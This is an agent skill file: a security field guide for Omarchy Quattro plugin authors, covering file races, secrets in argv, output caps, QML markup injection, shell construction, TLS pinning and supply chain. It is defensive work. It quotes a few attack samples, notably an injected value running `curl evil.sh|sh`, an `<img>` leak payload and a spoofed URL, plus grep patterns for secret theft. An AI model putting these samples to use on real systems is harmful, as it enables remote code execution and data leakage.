---
name: omarchy-plugin-security
description: Security review for Omarchy Quattro plugins (Quickshell/QML bar widgets with bash, python or node helpers) before submitting to the plugin marketplace. Use when writing, auditing or hardening an Omarchy plugin, when a marketplace issue gets needs-fixes or security-needs-fixes, when preparing a [Plugin] or [Verify] submission, or when the user asks whether a plugin is safe to publish. Based on every maintainer review comment in the marketplace repository.
---

# Omarchy plugin security: the pitfalls that get plugins blocked

This is a field guide distilled from the marketplace's own review history: all 5,130 submission issues in `omacom/omarchy-plugin-marketplace` (July to September 2026) and the roughly 5,500 review comments on them. The marketplace's security review is performed by an AI review agent run by the maintainer, which reads the full tree at the exact commit; the static baseline scanner is separate and much narrower. "Reviewer" below means that agent. Every pitfall below was a real blocking finding, most of them many times over. The counts are approximate numbers of review comments raising that point, so you can see what the reviewers actually spend their time on.

Read it before you write the plugin, not after the first `needs-fixes`. Every review round costs about a day, and reviewers re-read the whole tree on every push, so new findings appear after the first fix. Harden everything before the first submission.

The goal of this skill is that a plugin passes review on the first round.

## The reviewer's threat model in five sentences

Understand these and most of the rules below become obvious.

1. **The plugin runs inside one long-lived, shared process.** `omarchy-shell` is Quickshell and it hosts every widget. Anything that makes it allocate without bound, block, or fetch a URL affects the whole desktop, and it is "the one process on the desktop that should not be stoppable by a file".
2. **Everything you did not type yourself is input.** API responses, MPRIS metadata, window titles, device names, filenames, notification bodies, clipboard, `hyprctl` output, settings and state files, and the output of your own helper script. A window title is set by a web page. A USB stick sets its own product string.
3. **Another process running as the same user is in scope.** Any sandboxed app, browser tab or other plugin can plant a symlink, a FIFO or an oversized file at a predictable path, read `/proc/<pid>/cmdline`, or connect to your socket. A 0700 directory does not remove that boundary. (Since 4 September 2026 pure same-UID availability issues are classed as hardening rather than blockers, but reviewers still ask for the fixes and everything involving secrets, privilege or remote data still blocks. Do them anyway.)
4. **The check must be bound to the object you use.** A pathname test followed by a second open is a race. A byte cap applied after the data is in memory is "a consumer-after-allocation guard". A fix that moves the problem one layer over is called out as "the boundary moved rather than closed".
5. **Documentation is not mitigation.** A README sentence, a warning, a comment, or a prompt instruction to an LLM never substitutes for code. A README claim the code does not honour is itself a finding, in both directions: a README that promises a protection the code lacks, and a README that describes weaker or different behaviour than the code has ("trust on first use" in the README while the code demands an explicit pin). Reviewers verify the mechanism and treat the mismatch as the defect.

Two things reviewers say constantly: "This finding does not state that the plugin is malicious", and "Verification applies only to this exact snapshot and is not a security audit". Do not argue intent; fix the mechanism.

## Grep audit before you submit

Run these from the plugin root; they take seconds. Every hit is a place a reviewer will look, so the time goes into reading the hits, not into running them.

```bash
# 1. QML Text sinks without an explicit format (the single most common finding, ~1000 comments)
grep -rn --include='*.qml' -E '\b(Text|Label|TextEdit|StyledText)\s*\{' . | wc -l
grep -rn --include='*.qml' -c 'textFormat:' . 
# Every Text needs textFormat: Text.PlainText. The python audit further down lists the misses.

# 1b. Host-owned sinks the plugin cannot pin to PlainText: strip < > & and cap before these
grep -rn --include='*.qml' -E 'tooltipText:|showTooltip\(|ConfirmDialog|PanelSectionHeader|PanelHero|\.label:|message:' .

# 2. Whole-output collectors and shell strings (~800 and ~200 comments)
grep -rn --include='*.qml' -E 'StdioCollector|bar\.run\(|execDetached\("|"bash", *"-l?c"|"sh", *"-c"' .
grep -rn --include='*.py' -E 'shell=True|capture_output=True|communicate\(|os\.system' .
grep -rn --include='*.sh' -E '\$\(|eval |bash -c' .

# 3. Predictable paths and pathname I/O (~500 comments)
grep -rn -E '/tmp/|XDG_RUNTIME_DIR:-|mkdir -p|makedirs|write_text|read_text|json\.load\(open|FileView' .
grep -rn --include='*.sh' -E '> *"?\$|>> *"?\$|tee ' .

# 4. Secrets in argv (~230 comments)
grep -rn -E 'Authorization|Bearer|--user |-u "|token|password|passwd|secret' . | grep -v README

# 5. Network without bounds or with redirects
grep -rn -E 'curl ' . | grep -v -E 'max-filesize|head -c'
grep -rn -E 'curl .*-L|urlopen|requests\.|fetch\(|XMLHttpRequest' .
grep -rn -E 'http://|verify=False|-k |--insecure|CERT_NONE' .   # -k is fine only next to --pinnedpubkey

# 6. Supply chain and privilege
grep -rn -E 'curl .*\| *(ba)?sh|git clone|git pull|releases/latest|pip install|npm install|cargo install|yay |pacman |sudo |pkexec|systemctl|setcap' .
find . -type f -exec file {} + | grep -E 'ELF|Mach-O|PE32|compiled'

# 7. Agent instruction files and dev junk in the installable tree
ls -a | grep -E 'AGENTS.md|CLAUDE.md|\.agents|\.claude|\.codex|\.gemini|\.gstack|\.wrangler|__pycache__|\.pyc'

# 8. Files the scanner cannot handle (fails the whole baseline)
find . -type f -size +512k ! -name preview.png
grep -rlP '\x00' --include='*.qml' --include='*.sh' --include='*.py' --include='*.js' . 
find . -iname '*install*' -o -iname '*setup*' -o -iname '*uninstall*' | grep -E '\.(png|jpg|gif|webp)$'
```

Then run the marketplace's own scanner locally (see "The automated baseline" below) and read "Submission mechanics" so you do not lose a day on a stale SHA.

## 1. Files, paths and state

The largest family of findings after QML text. The model the reviewers want is the same every time: **open once, validate the descriptor, use that descriptor, never re-resolve the pathname.**

### Reading a file the shell or a helper did not just create (~480 comments)

`FileView` with `preload` (the default), `cat`, `jq file`, `head -c`, `Path.read_text()`, `json.load(open(path))`, `readFileSync` all follow symlinks, block on a FIFO, and read the whole file before any length check you wrote runs. `FileView` has no cap at all; binding `path` triggers the load.

Fix: a small helper invoked as an argv array that does one `open(O_RDONLY|O_NOFOLLOW|O_NONBLOCK|O_CLOEXEC)`, `fstat`s that descriptor for `S_ISREG`, owner == uid, `st_nlink == 1`, no group/other write bits for anything sensitive, and size, then reads `limit + 1` bytes from the same descriptor and rejects overflow rather than truncating. See the Python helper in the appendix. Keep `FileView` as a watcher only: `preload: false`, `watchChanges: true`, `blockAllReads: true`, and never call `.text()` or `.data()` on it.

Shell equivalent when a helper is overkill:

```bash
/usr/bin/dd if="$file" iflag=nofollow,nonblock,count_bytes,fullblock bs=1 count=$((MAX + 1)) status=none
# or
# Not `exec {fd}<"$file"`: a bash redirect does not pass O_NOFOLLOW, so it
# happily reads through a planted symlink. The sentence below says as much;
# it used to sit here as an equivalent anyway.
```

A bash `<` redirect and `exec 3<file` do not pass `O_NOFOLLOW`; reviewers correct this explicitly. `[[ -L $f || ! -f $f ]]` followed by `cat` is "three separate resolutions of the same name".

Why `O_NONBLOCK` as well: `O_NOFOLLOW` only rejects a final symlink. A FIFO planted at the path blocks `open()` forever before your type check runs, and that hangs the shell. Add `O_NONBLOCK`, `fstat`, then clear it for regular files.

### Writing to a predictable path (~490 comments)

`>`, `>>`, `tee`, `cp -f`, `install`, `ln -sfn`, `sed -i`, `open(path, "w")`, `write_text()`, `FileView.setText()`, `writeFileSync`, `curl -o` all follow a planted symlink and truncate whatever it points at. A fixed `.tmp`, `.bak` or `$$`-suffixed sibling is just another predictable path. `umask 077` and a later `chmod` do not protect the initial open. Quickshell's `FileView { atomicWrites: true }` was measured to create mode 644 under the default umask, so it is unusable for anything private.

Fix: create an unpredictable temporary in the destination directory with `mkstemp` or `O_CREAT|O_EXCL|O_NOFOLLOW|O_CLOEXEC` at mode 0600, `fchmod` before the first byte, write through that descriptor in a checked loop, `fsync`, then `rename`/`os.replace` (dirfd-relative), then `fsync` the directory. `rename(2)` replaces a symlink at the destination instead of writing through it. Unlink the temporary in a `finally` or an `EXIT` trap. Do not close the descriptor and reopen the temporary by name; do not `chmod` the path afterwards.

```bash
umask 077
t=$(mktemp -p "$(dirname -- "$dest")" .name.XXXXXXXXXX)
trap 'rm -f -- "$t"' EXIT
printf '%s' "$payload" >"$t"      # $t is fresh and ours; this is the one redirect that is fine
mv -f -T -- "$t" "$dest"
```

### Check-then-open races (~450 comments)

`-f`, `-L`, `stat`, `exists()`, `is_file()`, `realpath`, `find -type f` followed by a separate open, `cat`, `jq`, `sqlite3.connect`, `Image.source` or `FileView.reload()`. A helper that validates a file through a descriptor and then returns a pathname that QML reopens has the same problem. Fix: the descriptor you validated is the descriptor you read; hand bytes to the next stage via stdin, `/proc/self/fd/N`, or a bounded `data:` URL rather than a path.

### The parent chain (~130 comments)

`O_NOFOLLOW` protects only the final component. `mkdir -p`, `os.makedirs`, `Path.resolve()`, `mktemp -p dir`, `mv`, `chmod dir` all re-resolve the parents by pathname, and `~/.local/state` can be a symlink to another directory the attacker also owns, which still passes a uid/mode check. `mkdir -p -m 700` neither fails on nor re-modes an existing directory or symlink.

Fix: walk from a trusted anchor with `openat(O_RDONLY|O_DIRECTORY|O_NOFOLLOW|O_CLOEXEC)` one component at a time, `fstat` each held descriptor (owner == uid, real directory, 0700 for the plugin's own directory), `mkdirat` missing components, then do every `openat`, `mkstemp(dir_fd)`, `renameat`, `unlinkat`, `fchmod` relative to the held descriptor. `openat2` with `RESOLVE_NO_SYMLINKS` is the strongest form. In shell: `mkdir -p -m 700` followed by an owner, type and `-L` check on the result is accepted for a plugin-owned state directory under the current policy, as long as you refuse (not repair) a symlink and every file inside is then opened `O_NOFOLLOW` through a helper; the full dirfd walk is what reviewers ask for the moment credentials, another principal or a privileged writer is involved.

### Shared /tmp and the `XDG_RUNTIME_DIR` fallback (~150 comments)

`/tmp/<plugin>`, `/tmp/<plugin>-$UID`, `/dev/shm/...`, `${XDG_RUNTIME_DIR:-/tmp}`, and a hard-coded `/run/user/1000`. Another account pre-creates the path, reads your snapshots, owns your socket, or replaces a script between write and execution. Fix: prefer stdout with no file. Otherwise `: "${XDG_RUNTIME_DIR:?}"` and fail closed, or `mktemp -d` with a trap; verify an existing directory component by component; use `$XDG_STATE_HOME`/`$XDG_CACHE_HOME` for persistent state. Never wildcard-delete in `/tmp`.

### Repair the directory unconditionally, and its contents too

Putting the `chmod` inside `if [[ "$mode" != "700" ]]` reads logically and is wrong. The mode of the directory says nothing about the files in it: a directory that is 700 today can hold 644 files from an earlier version, and those are then never repaired. Worse, a directory that was ever wider can hold entries you did not put there, and a symlink on the fixed name of your cache file sends every later write to a file the planter chose. Closing the directory does not clean that up. So the repair runs every time and removes anything that is not a regular file (`find` uses `lstat`, so a symlink is `-type l`):

```bash
find "$dir" -mindepth 1 -maxdepth 1 ! -type f -exec rm -rf -- {} + 2>/dev/null
find "$dir" -mindepth 1 -maxdepth 1 -type f -exec chmod 600 -- {} + 2>/dev/null
```

Test the write path, because it takes two lines and reviewers do exactly this:

```bash
echo "must survive" > /tmp/victim
ln -sf /tmp/victim ~/.cache/my-plugin/cache.json
my-script list >/dev/null
cat /tmp/victim     # unchanged? then the write is safe
```

One bash trap when you move these helpers around: a function exists only *after* its definition, and `private_dir "$X" || return 0` near the top of a script swallows "command not found" as an ordinary false. The script then runs on as if nothing is wrong, only without ever reading your config.

### Smaller members of the same family

- **Lock and PID files**: `exec 9>"$lock"` before `flock` truncates through a symlink. Open the lock `O_CREAT|O_NOFOLLOW` 0600 in the verified runtime directory and validate it on the descriptor, or `flock` a read-only descriptor of the existing file.
- **Path traversal**: profile names, slugs, IDs, archive members and IPC-supplied paths joined onto a directory. `^[A-Za-z0-9._-]+$` still admits `..`. Reject `.`, `..` and separators explicitly, canonicalize beneath an opened root, and refuse rather than repair.
- **Deletion**: `rm -rf`, `remove_tree`, glob deletes and `find -delete` by pathname after a separate check. Delete relative to a held dirfd, or rename to an unpredictable quarantine name through the dirfd, verify the inode, then unlink.
- **Archives**: reject absolute and traversal members, symlinks, hard links, devices, unexpected entry counts and expanded sizes before extraction. A 4 GiB stream cap is not a member cap.
- **Fail closed**: a read that fails must not become "the file is absent, initialize it". Distinguish `ENOENT` from every rejected state; never delete an object you did not create; a failed `fchmod` or `flock` is an error, not a warning.
- **Durability**: fsync the directory after rename; check the return of every write; a state file that reports "saved" must be durably published.

## 2. Secrets and credentials

### Never in argv (~230 comments)

`/proc/<pid>/cmdline` is world-readable, so `curl -H "Authorization: Bearer $t"`, `curl -u`, `-d "$body"`, a token in a URL, `jq --arg token`, `wl-copy <secret>`, `wtype <text>`, `bash -c "... $token ..."` and `python3 -c "... $key ..."` show the secret to every account on the machine while the process runs. A widget that polls reopens that window every few seconds. A 0600 key file does not help if every request expands it into an argument. "Credentials must not travel in argv. That is not a hardening preference; it is the difference between a secret and a value anyone on the system can read."

The environment is second best: `/proc/<pid>/environ` is readable by every same-user process, and it inherits into every child. Reviewers blocked "moved it from argv to `Process.environment`". It is accepted only where the CLI has no other route (`BW_SESSION` was accepted, then withdrawn).

Fix: stdin or a private descriptor between fixed programs. Reject CR, LF and NUL in the token before it touches any parser (`case $token in *[$'\r\n']*) exit 1 ;; esac`). A quote or newline interpolated into `curl --config` is another config directive: curl will fetch that URL and send the `Authorization` header with it.

```bash
# curl: header on stdin. -H @- is a header list, not a config file.
printf 'Authorization: Bearer %s\n' "$token" \
  | /usr/bin/curl -q -sS -H @- --max-time 10 --max-filesize 1048576 -- "$url"
# body on stdin
jq -n --arg t "$token" '{token:$t}' | /usr/bin/curl -q -sS --data-binary @- -- "$url"
# clipboard and typing
printf '%s' "$secret" | /usr/bin/wl-copy
printf '%s' "$text" | /usr/bin/wtype -
# keyring
printf '%s' "$token" | /usr/bin/secret-tool store --label='...' service myplugin
```

In QML use `stdinEnabled: true` and `proc.write(...)` on the one process that needs it. `curl -q` (or `--disable`) must be the first option, or `~/.curlrc` can add a second URL or redirect and the `-H @-` header goes there too. `~/.curlrc` is a same-user file, but because a credential is on the line reviewers grade a missing `-q` as a blocker, not as hardening. Turn `set -x` off around the call: bash tracing prints the words of every command to stderr, and the widget's stderr lands in the journal.

```bash
untrace() { case "$-" in *x*) TRACED=1; set +x ;; *) TRACED=0 ;; esac; }
retrace() { (( TRACED )) && set -x; return 0; }
``` Verify with `cat /proc/$(pgrep -n curl)/cmdline | tr '\0' ' '` while a request is running. If an upstream CLI only takes the secret as an argument, reviewers expect you to remove that feature or compute it locally (TOTP via `hmac`/`hashlib` was the accepted answer).

### Files holding credentials or private content (~150 comments)

`open("w")` then `chmod 600` is a window, and `chmod` follows a replaced symlink. Default umask makes token files 644 in 755 directories; a later `umask 077` never repairs existing files; `mkdir -p -m 700` never tightens an existing directory. Automatic fallback from `secret-tool` to a plaintext file, or "encryption" keyed by `/etc/machine-id` with a base64 fallback, is "persistent credential degradation".

Fix: the mode is set at creation (`os.open(..., O_CREAT|O_EXCL|O_NOFOLLOW, 0o600)`, `mkstemp` + `fchmod`, `install -m 600`, `umask 077` before `mktemp`), inside a verified 0700 directory, published atomically. Read credential files only through a validated descriptor and refuse a group- or world-readable one with a `chmod 600` hint instead of silently downgrading. Prefer the desktop keyring (`secret-tool`, libsecret) with no file fallback; if plaintext storage must exist, make it an explicit, clearly worded opt-in.

Cache and state are private too, even without tokens in them: mail subjects, camera frames, coordinates, window titles, `/proc/<pid>/cmdline` snapshots (they contain passwords and document URLs) and transcripts. Never store argv as undo state.

### Logs, notifications, errors, UI state

Redact before logging (`JSON.stringify(cmd)` with the `Authorization` header in it was a blocker); never put a secret or a secret-bearing URL in an error message, a `notify-send` body, or a diagnostic command; clear password fields on every completion, cancel and error path; do not prefetch secrets before an explicit reveal or copy action; `wl-copy --clear` after a delay only if the clipboard still holds your value; log URLs as scheme + host only.

## 3. Bounds and resource exhaustion

The second-largest family. The rule: **the cap lives at the producer, before the bytes exist in the shell, and it is cap + 1 so overflow is detected rather than silently truncated.**

### Child-process output collected whole (~830 comments)

`StdioCollector` (especially `waitForEnd: true`), `subprocess.run(capture_output=True)`, `communicate()`, `Command::output()`, `$(...)` retain the complete stdout and stderr of `hyprctl -j clients`, `pacman`, `journalctl`, `restic --json`, `nvidia-smi`, `wl-paste`, `gh api` before any `.length` or `slice()` check runs. `timeout`, `--max-time`, `--tail 200` and watchdogs bound time or lines, not bytes. A row limit does not bound one huge line. Slicing a QString frees nothing.

Fix:

```bash
# producer-side cap; with pipefail the substitution fails if cmd fails,
# and a truncated result is detected by length (head read MAX + 1 bytes).
# ${#out} counts characters, not bytes, unless LC_ALL=C.
set -o pipefail
LC_ALL=C
out=$(/usr/bin/timeout -k 2 -- 20 cmd args | /usr/bin/head -c $((MAX + 1))) || exit 1
[ ${#out} -le "$MAX" ] || { echo 'output exceeds limit' >&2; exit 1; }
```

`PIPESTATUS` does not survive a `$(...)` substitution (the pipeline ran in a subshell), so do not try to read it afterwards; rely on `pipefail` plus the length check, or run the pipeline without a substitution and write to a held descriptor. Without `LC_ALL=C`, a UTF-8 overflow can have `${#out} <= MAX` while `head -c` already read `MAX + 1` bytes.

In QML replace `StdioCollector` with `SplitParser { splitMarker: "" }` and count bytes per chunk, then `signal(15)` and later `signal(9)` on overflow, or better, call a helper that already bounds everything and returns a small, strictly shaped JSON document. "No StdioCollector remains anywhere in the tree" is the cleanest accepted state. Bound stderr too and render it as PlainText with a small cap. In Python read both streams incrementally with `select` against a monotonic deadline and kill the process group on overflow.

A default `SplitParser` is not a byte ceiling: it must buffer until the newline before `onRead` can reject the line. Python `readline()`, `for line in proc.stdout`, `awk length($0)` have the same problem. Use raw chunks with a byte budget before any line assembly.

### Remote responses (~450 comments)

`curl` with only `--max-time`; `response.read()`, `json.load(resp)`, `HTTPError.read()`; `xhr.responseText` measured after `DONE`; WebSocket frames without `max_size`; MQTT with the protocol's 268 MB variable length; downloads to disk before the hash is checked; pagination driven by the server's `has_more`. `--max-filesize` alone is advisory: it acts on a declared `Content-Length` and does nothing for a chunked body.

Fix: `curl -q --fail --max-time 10 --max-filesize N -- "$url" | head -c $((N + 1))` under `pipefail`; Python `resp.read(MAX + 1)` and reject overflow; an explicit finite `max_size` on WebSockets (state the number; relying on a library default is graded as hardening at best); a small documented packet ceiling for MQTT; cap error bodies; a fail-closed page count and aggregate ceiling across pagination; a whole-transfer deadline (socket timeouts are per operation, so a trickling peer keeps you alive forever; DNS resolution must be inside the deadline too).

### After the byte cap: schema, cardinality and depth (~430 comments)

A 1 MiB response still holds tens of thousands of valid objects or one huge string. Reviewers block unbounded arrays fed to `Repeater` or `ListModel`, unbounded string lengths, nesting depth, non-finite numbers, `sort()` of the full array before slicing, and per-item process fan-out. Validate every consumed element by expected type and finite range before installing the model; cap counts, per-string length, nesting and total bytes; reject the whole response or cache document on mismatch, do not truncate it into shape; apply the same limits to state files, IPC input and settings that you apply to interactive input. Use `Object.create(null)` or `Map` for any collection keyed by attacker-chosen strings (`__proto__`, `constructor`).

### Other bounds that got plugins blocked

- **Deadlines and process-group cleanup** (~530 comments, see section 9).
- **Directory enumeration**: `find | sort | head` makes `sort` hold everything; `FolderListModel` materializes the whole directory before `count` exists; `os.walk` and `rglob` with no item, depth, time or descriptor budget. Stop discovery at a bounded count before sorting; do not follow directory symlinks.
- **Images and decoders**: `sourceSize` limits decoded dimensions only, not fetched bytes or decode work. Validate real format and dimensions under explicit limits, run ImageMagick with `-limit` values and a timeout, refuse SVG from untrusted sources, bound archive and decompression output.
- **Polling storms and retries**: a 250 ms retry with no cap, a restart every three seconds forever, a 20 ms `hyprctl` poll. Bounded exponential backoff with jitter, a failure budget, single-flight with a bounded queue.
- **Session-lifetime growth**: maps, queues and caches that never evict inside a keep-loaded service. Fixed-size FIFO or LRU.
- **Ingress limits**: `maximumLength` on every `TextInput` including the lock-screen password field; small explicit bounds at every IPC and settings entry point; `parseFloat` prefix parsing and `NaN`/infinity rejected.
- **Wrong unit**: `String.slice(0, MAX_BYTES)` measures UTF-16 units. Measure bytes in a `Buffer`, at the producer.

## 4. QML rendering sinks

### `Text` without `textFormat: Text.PlainText` (~1,000 comments)

The single most reported finding. A `Text`, `Label`, `TextEdit` or Quattro component without `textFormat` sits on `Text.AutoText`: Qt sniffs the string and renders it as rich text if it looks like markup. Rich text loads `<img src="...">`, which is a real HTTP or `file:` request from the shell process to a location the string's author picks. This is verified, not theoretical, and every value you did not type is a candidate: API fields, MPRIS metadata, window titles and app ids, `.desktop` names, device, SSID and Bluetooth names, filenames, ICS summaries, clipboard, helper stderr, error messages, stored notes, other plugins' manifests. `elide`, `maximumLineCount`, tag strippers, `html.unescape()` and truncation do not change how the value is interpreted. Reviewers grep-count `textFormat` ("0 of 32 across `Panel.qml`") and a fix that misses one sink is re-blocked.

You can verify the mechanism without the shell: put `<img src="http://127.0.0.1:PORT/leak.png">` in a default `Text`, run `QT_QPA_PLATFORM=offscreen qml6 test.qml` with a listener on that port, and watch the `GET /leak.png` arrive.

Fix: `textFormat: Text.PlainText` on every `Text`, including literal-only ones so the invariant is auditable, plus length and control-character caps at ingestion. Where styling is genuinely needed, use `Text.RichText` only with every variable escaped (`&` first, then `<`, `>`) and colours from a fixed table, or split into several PlainText items. A Markdown renderer must reject raw HTML and images; a denylist of a few tag shapes is "insufficient at this trust boundary". Audit mechanically:

```bash
python3 - <<'EOF'
import re, glob
for f in sorted(glob.glob('**/*.qml', recursive=True)):
    src = open(f).read()
    for m in re.finditer(r'\b(Text|Label|TextEdit|StyledText)\s*\{', src):
        i, depth = m.end(), 1
        while i < len(src) and depth:
            depth += (src[i] == '{') - (src[i] == '}'); i += 1
        if 'textFormat:' not in src[m.end():i]:
            print(f"MISSING {f}:{src[:m.start()].count(chr(10))+1}")
EOF
```

### Shared host components you cannot pin (~130 comments)

`WidgetButton.text` and `.tooltipText`, `BarIconButton`, `bar.showTooltip()`, `ConfirmDialog.message`, `PanelSectionHeader.text`, `PanelHero.title`, Quattro `Dropdown` items and the bar tooltip are rendered by the shell with `AutoText` and the plugin cannot set the format there. Strip before handoff: a `plain()` helper removing `<`, `>` and `&` (and C0/C1 and bidi controls), a strict length cap, or a static string. `sanitizeLabel` that strips only controls is not enough.

### `Image.source`, `AnimatedImage`, `Loader` (~130 comments)

MPRIS `artUrl`, API thumbnails, notification icons, tray icons, `data:` URIs, `file:///tmp/...` paths assigned to `Image.source` make the shell load local, loopback, private-network or huge resources and follow Qt's own redirects. `safeIconSource()` that rejects only `http` still passes `file:` and `qrc:`. A `stat` then `Image.source` is a race. Fix: fetch through a bounded helper (HTTPS host allowlist, no cross-origin redirect, byte and dimension caps, magic-byte format check) into an exclusively created plugin-owned file, then point `Image` at that file with `sourceSize`, or emit a bounded `data:` URL from validated bytes. Icons only via theme names or `image://` providers. `Loader` sources only from a fixed ID set.

### Notification summary and body

`notify-send`, `omarchy-notification-send` and the FreeDesktop protocol render summary and body with components the plugin cannot pin to PlainText, and the body is markup-capable. Strip `<`, `>`, `&` and control characters and cap the length before any stored or remote string (a camera name, a filename, a sender) goes into either field, in the script as well as in QML, because the script is also a CLI entry point. Do not store executable actions with a toast; a persisted `--exec` argv is replayed later without the user's consent at that moment.

## 5. Command construction and execution

### Shell strings built from data (~210 comments)

`bash -c "..."`, `sh -c`, `bar.run(string)`, `Util.execDetached(string)` and `shell.run` all resolve to `["bash", "-lc", command]`. Data spliced into that string is code: a URL with `'; cmd; :'`, a filename with a quote, a `.desktop` `Exec`, `expires_in` from a token response inside `$(( ))`, a config value in a GNU `sed` program (the `e` flag executes), a note body in a here-document. `JSON.stringify()` and `encodeURIComponent` are not shell escaping; `Util.shellQuote` on the outer shell does not protect an inner language (`hyprctl eval` Lua, `python3 -c`, `nmcli` editor input, Hyprland's own re-parse of `exec`).

Fix: remove the shell. `Process.command` and `Quickshell.execDetached` take arrays; every value is its own element. If a script must stay, it is a constant and takes `"$1"`, `"$2"` or `environment`. Pass data to Python and jq via argv or stdin (`jq --arg`, `jq -Rn`), never by interpolation. Values that reach `hyprctl eval` or `dispatch` are integers, `true`/`false`, `^0x[0-9a-f]+$` addresses, names from a closed allowlist, or `luaQuote`d then `shellQuote`d in that order. Validate with an anchored regex at parse time and again before use; refuse, do not repair.

### Bash arithmetic evaluates its input twice

Inside `$(( ))`, `[ x -gt y ]`, `let` and `declare -i`, bash reads the *contents* of a name and evaluates that again as arithmetic, and an array subscript there is a command substitution. If the server answers `"expires_in": "a[$(curl evil.sh|sh)]+3600"`, the command runs and a plausible number still comes out, so you see nothing. This was a real blocker on a token-refresh script. Put anything that will be arithmetic through a filter first, or parse in Python where a non-number is just a failed `int()`:

```bash
number_or() {
  local value="$1" fallback="$2"
  case "$value" in ''|*[!0-9]*) printf '%s' "$fallback"; return 0 ;; esac
  [ "${#value}" -le 12 ] || { printf '%s' "$fallback"; return 0; }
  printf '%s' "$((10#$value))"
}
sleep_until=$(( $(date +%s) + $(number_or "$expires_in" 300) ))
```

### Executables and environment (~180 comments)

Bare `hyprctl`, `jq`, `curl`, `python3`, `#!/usr/bin/env bash`, `shutil.which()`, `command -v`, `~/.local/bin` fallbacks, and executable overrides from environment variables resolve through a PATH another process can prepend to. `bash -lc` reads profiles; a non-interactive bash still honours `BASH_ENV`; `PYTHONPATH`, `PERL5OPT`, `GIT_DIR` and `LD_PRELOAD` ride in with the inherited environment. Since the September policy this is hardening for same-UID-only cases, but it stays a blocker wherever a credential or privilege boundary is involved (a shadow `curl` receives the bearer token). Fix: absolute `/usr/bin/...` paths, `clearEnvironment: true` with an explicit minimal environment (`HOME`, `XDG_RUNTIME_DIR`, a fixed `PATH`), `/usr/bin/python3 -I -S` for the system interpreter (for a venv interpreter at a fixed plugin-owned path use `-I` alone, since `-S` drops the site-packages the venv exists for), bundled helpers resolved from the manifest directory (`manifest.__sourceDir` and `Qt.resolvedUrl("bin/...")` relative to the plugin file are both accepted), and a hostile-PATH regression test. The rule covers every executable on the credential path, not only the one that receives the secret: the `openssl` that computes a certificate pin decides whether the key goes out at all.

### Option injection, URLs, stored actions

- Put `--` before every data argument: `["wl-copy", "--", text]`, `["xdg-open", "--", url]`, `mpv --no-terminal -- "$stream"`, `git clone -- url dest`. `ssh host` parses `-oProxyCommand=...` as an option even from argv (verify with `ssh -G`); `yt-dlp` runs `--exec`. Prefix search terms (`"ytsearch12:${q}"`), reject leading `-`, validate the whole shape.
- URLs handed to `xdg-open`, `Qt.openUrlExternally`, `urlopen` or a browser: parse once, require `https` (plus `http`/`mailto` only where needed), reject userinfo and control characters, canonicalize and match hosts exactly or on a `.domain` boundary. `https://evil.example\@vendor.com/` passes a naive regex; `urlopen` speaks `file:` and copies your SSH key into the download folder. Validate at ingestion and again at the consumer.
- Never execute strings from data: no `source`/`dofile` of config or state, no `eval` of `.desktop` lines, no notification `exec` hints replayed on click ("app name/hints are not an authorization boundary"), no launch command derived from a window class, no `git status` in untrusted repositories without `core.fsmonitor=` and `core.hooksPath=/dev/null`.
- Generated config is a parser boundary: escape or refuse CR/LF and quotes for Lua, JSONC, TOML, systemd units, modprobe, `curl --config` and Git's credential protocol; `sed`-splicing a `.desktop` `Name=` into `omarchy-menu.jsonc` planted a launcher command.
- Do not add `--no-sandbox` to Electron or Chromium launches.

## 6. Network and TLS

- **Redirects with credentials** (~130 comments): `urllib`'s default handler and `curl -L` forward `Authorization` to whatever host a 30x names, including HTTPS to HTTP. Refuse redirects on credentialed requests (a `HTTPRedirectHandler` whose `redirect_request` returns `None`, curl without `-L`), or revalidate every hop against the exact `(scheme, host, port)` and strip credentials on any change. `--proto-redir =https` restricts only the scheme.
- **Plain HTTP with a secret** (~60 comments): accepting `http://` base URLs, `curl -k`, `verify=False`, `ssl._create_unverified_context()`, mpv `tls_verify=0`, `/cert:ignore`, defaulting to `http://ip-api.com`. Enforce HTTPS in code, allow HTTP only for a literal loopback address, never make verification disableable. For a LAN device with a self-signed certificate pin the fingerprint or public key in an explicit first-use flow (`curl --pinnedpubkey`) and reject changes; do not offer an insecure fallback. The address of a device on a DHCP lease is a guess about who is listening, not a statement about who they are, so check the pin *before* the credential goes on the wire:

```python
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False        # CN is a serial number, not a hostname
ctx.verify_mode = ssl.CERT_NONE   # replaced by the narrower check below
sock = ctx.wrap_socket(raw)       # handshake: nothing secret has gone out yet
if sha256(sock.getpeercert(binary_form=True)).hexdigest() != pinned:
    raise Untrusted()             # only now send the credential
```

`CERT_NONE` here is not a weakness but the replacement of hostname verification with something stricter: exactly one certificate is allowed, the one a person looked at during setup. Re-pinning is an explicit, interactive step that shows the old and the new fingerprint, never automatic.
- **SSRF and DNS rebinding** (~90 comments): any configurable or response-supplied URL can point at loopback, RFC1918, link-local, `.local`, or resolve differently between your check and the connection. Resolve, reject every non-global address, pin the validated address to the connection (`curl --resolve`) while keeping Host and SNI, and repeat per hop; disable environment proxies (`ProxyHandler({})`, `--noproxy '*'`); parse addresses with a real IP parser (`127.999.999.999` passed a regex).
- **Fixed origins**: keep API bases as constants. A configurable `apiUrl` that receives the stored token is a blocker unless it is a prominent, consented development override with no credential reuse.
- **curl hygiene**: `curl -q` first, `--proto =https --proto-redir =https`, `--max-time`, `--max-filesize` plus `head -c`, `-H @-` or `--data-raw` so a leading `@` stays literal, URL as its own argument after `--`. Do not `printf` a `--config` file from a token: a quote or newline is another directive.
- **OAuth**: loopback callback on `127.0.0.1`, random `state` compared exactly, PKCE, a finite timeout, no token through a third-party proxy.

## 7. Supply chain and installation

- **Mutable code at install or run time** (~250 comments): `curl ... | sh`, `bash <(curl ...)`, a clone of `main` or a release tag ("a Git tag can be moved"), `releases/latest`, `cargo install --git` without `--rev`, `pip install` without hashes, `npm -g @latest`, `npx -y` on every refresh, `yay -S` of `-git` packages, `docker :latest`, `git pull` from inside the plugin, `yt-dlp -U`, a checksum fetched from the same release as the binary ("checksums only bind bytes to themselves"). The reviewed snapshot must be the code that runs. Require a full 40-character SHA, fetch that object, verify `rev-parse FETCH_HEAD^{commit}` and `HEAD` equal it, check it out detached in a fresh hook-free directory (`-c core.hooksPath=/dev/null`), then build; `cargo build --locked`; `pip --require-hashes --no-deps` from a committed lock; artifacts by URL plus size plus SHA-256 stored in the reviewed commit, downloaded to a private temporary, hashed while streaming with a size ceiling, then atomically promoted. Remove self-update paths entirely. Preferred: no source build at all; `omarchy pkg add` and documented prerequisites.
